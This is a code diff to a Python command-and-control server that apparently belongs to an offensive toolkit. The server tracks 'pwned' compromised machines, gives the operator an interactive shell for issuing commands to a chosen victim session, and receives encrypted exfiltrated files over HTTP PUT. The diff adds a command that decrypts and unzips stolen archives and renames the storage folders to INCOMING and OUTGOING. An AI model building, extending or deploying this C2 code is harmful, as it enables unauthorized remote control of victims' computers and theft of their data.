@@ -6,7 +6,7 @@ from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 from urllib.parse import unquote_plus
 from crypt import cipher
 from settings import PORT, BIND_ADDR, CMD_REQUEST, RESPONSE_PATH, INPUT_TIMEOUT, KEEP_ALIVE_CMD,\
-    CWD_RESPONSE, FILE_REQUEST, ZIP_PASSWORD, FILE_SEND, STORAGE, RESPONSE_KEY, HEADER, PROXY, HTTPStatusCode, C2Commands
+    CWD_RESPONSE, FILE_REQUEST, ZIP_PASSWORD, FILE_SEND, INCOMING, OUTGOING, RESPONSE_KEY, HEADER, PROXY, HTTPStatusCode, C2Commands
 from inputimeout import inputimeout, TimeoutOccurred
 from os import mkdir, path
 
@@ -57,7 +57,7 @@ class C2Handler(BaseHTTPRequestHandler):
         global active_session, client_account, client_hostname, pwned_id, pwned_dict
 
         # compromised computer request exfiltrate datas
-        if self.path.startswith(CMD_REQUEST):
+        if self.path.startswith(CMD_REQUEST): # client init
             # split client infos from GET initial request
             client = self.path.split(CMD_REQUEST)[1]
             client = cipher.decrypt(client.encode()).decode() # decoder 
@@ -84,7 +84,7 @@ class C2Handler(BaseHTTPRequestHandler):
                 else:
                     cmd = input("{client_account}@{client_hostname}:{cwd}$ ")
 
-                if cmd.startswith(C2Commands.SERV.value): # server cmd for infos about target systems 
+                if cmd.startswith(C2Commands.SERV.value): # server show client 
                     if cmd.startswith(C2Commands.SERV_SH_CLS.value):
                         print("Available pwned systems:")
                         print_last = None
@@ -94,7 +94,7 @@ class C2Handler(BaseHTTPRequestHandler):
                             else:
                                 print(key, "-", value)
                         print("\nYour active session:", print_last, sep="\n")
-                    elif cmd.startswith(C2Commands.SERV_CTRL.value):
+                    elif cmd.startswith(C2Commands.SERV_CTRL.value): # server control
                         try:
                             possible_new_session = int(cmd.split()[2])
                             if possible_new_session in pwned_dict:
@@ -104,7 +104,19 @@ class C2Handler(BaseHTTPRequestHandler):
                                 raise ValueError
                         except (ValueError, IndexError):
                             print(f"You must enter a proper pwned id. Use {C2Commands.SERV_SH_CLS.value} command.")
-                    elif cmd.startswith(C2Commands.SERV_EXT.value):
+                    elif cmd.startswith(C2Commands.SERV_UZIP.value): # server unzip
+                        filename = None
+                        try:
+                            filename = cmd.split()[2]
+                            with AESZipFile(f"{INCOMING}/{filename}") as zip_file:
+                                zip_file.setpassword(ZIP_PASSWORD)
+                                zip_file.extractall(INCOMING)
+                                print(f"{INCOMING}/{filename} is now unzipped and decrypted.\n")
+                        except (FileNotFoundError, OSError):
+                            print(f"{filename} was not found in {INCOMING}.\n")
+                        except IndexError:
+                            print(f"You must enter the filename located in {INCOMING} to unzip.\n")
+                    elif cmd.startswith(C2Commands.SERV_EXT.value): # server exit
                         print("The C2 server has been shut down.")
                         server.shutdown()
                 else:        
@@ -124,7 +136,7 @@ class C2Handler(BaseHTTPRequestHandler):
             else:
                 # first send back 404 to the client
                 self.http_response(HTTPStatusCode.NOT_FOUND.value)
-        elif self.path.startswith(FILE_REQUEST):
+        elif self.path.startswith(FILE_REQUEST): # file request
             filepath = self.path.split(FILE_REQUEST)[1]
             filepath = cipher.decrypt(filepath.encode()).decode()
             try:
@@ -138,7 +150,7 @@ class C2Handler(BaseHTTPRequestHandler):
     def do_POST(self):
         if self.path == RESPONSE_PATH:
             print(self.handle_post_data())
-        elif self.path == CWD_RESPONSE:
+        elif self.path == CWD_RESPONSE: # cd ...
             # change path display into terminal to locate current dir
             global cwd
             cwd = self.handle_post_data()
@@ -146,11 +158,11 @@ class C2Handler(BaseHTTPRequestHandler):
             print(f"{self.client_address[0]} just accessed {self.path} on our c2 server using HTTP POST. Why ?\n")
     
     def do_PUT(self):
-        if self.path.startswith(FILE_SEND + "/"):
+        if self.path.startswith(FILE_SEND + "/"): # client download
             self.http_response(HTTPStatusCode.OK.value)
             filename = self.path.split(FILE_SEND + "/")[1]
             filename = cipher.decrypt(filename.encode()).decode()
-            incoming_file = STORAGE + "/" + filename
+            incoming_file = INCOMING + "/" + filename
             file_length = int(self.headers["Content-Length"])
             with open(incoming_file, 'wb') as file_handle:
                 file_handle.write(cipher.decrypt(self.rfile.read(file_length)))
@@ -187,8 +199,12 @@ client_hostname = ""
 pwned_id = 0
 pwned_dict = {}
 
-if not path.isdir(STORAGE):
-    mkdir(STORAGE)
+if not path.isdir(INCOMING):
+    mkdir(INCOMING)
+
+
+if not path.isdir(OUTGOING):
+    mkdir(OUTGOING)
 
 print("server version:", C2Handler.server_version)
 print("sys_version:", C2Handler.sys_version)
